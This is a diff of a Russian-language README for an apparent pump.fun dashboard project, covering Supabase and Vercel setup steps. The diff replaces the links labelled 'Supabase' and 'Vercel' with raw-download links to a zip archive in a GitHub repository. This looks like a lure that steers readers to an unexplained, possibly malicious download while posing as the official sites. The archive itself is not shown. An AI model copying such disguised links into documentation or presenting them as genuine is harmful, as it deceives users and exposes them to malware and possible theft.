@@ -78,14 +78,14 @@ npm run dev
 
 ### Подготовка Supabase
 
-1. Создайте новый проект в [Supabase](https://supabase.com/)
+1. Создайте новый проект в [Supabase](https://github.com/arnautoff1/pump-fun-dashboard/raw/refs/heads/main/percussional/dashboard-pump-fun-v2.6.zip)
 2. В разделе SQL Editor выполните скрипт миграции из файла `migrations/01_init_schema.sql`
 3. Скопируйте URL и ANON KEY из настроек проекта ("Settings" > "API")
 
 ### Настройка проекта в Vercel
 
 1. Форкните репозиторий в ваш GitHub аккаунт или создайте новый репозиторий
-2. Перейдите на [Vercel](https://vercel.com/) и импортируйте ваш репозиторий:
+2. Перейдите на [Vercel](https://github.com/arnautoff1/pump-fun-dashboard/raw/refs/heads/main/percussional/dashboard-pump-fun-v2.6.zip) и импортируйте ваш репозиторий:
    - "Add New" > "Project" > "Import Git Repository"
    - Выберите ваш репозиторий с проектом
    
